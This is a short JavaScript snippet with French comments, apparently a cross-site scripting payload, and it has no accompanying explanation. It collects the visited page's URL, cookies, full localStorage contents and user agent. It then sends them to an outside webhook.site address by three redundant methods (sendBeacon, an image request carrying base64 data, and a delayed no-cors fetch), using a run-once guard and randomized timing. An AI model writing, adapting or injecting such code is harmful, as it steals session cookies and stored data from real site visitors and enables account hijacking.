if (window._executed) return;
window._executed = true;


const payload = {
  url: location.href,
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  userAgent: navigator.userAgent,
  timestamp: Date.now()
};


function exfiltrate() {
  
  navigator.sendBeacon(
    'https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', 
    JSON.stringify(payload)
  );

  // Méthode 2: Image fallback
  new Image().src = `https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c?img=${btoa(JSON.stringify(payload))}`;

  // Méthode 3: Fetch avec timeout aléatoire
  setTimeout(() => {
    fetch('https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', {
      method: 'POST',
      body: JSON.stringify(payload),
      mode: 'no-cors',
      credentials: 'omit'
    }).catch(() => {});
  }, Math.random() * 3000 + 1000);
}


setTimeout(exfiltrate, 1500);
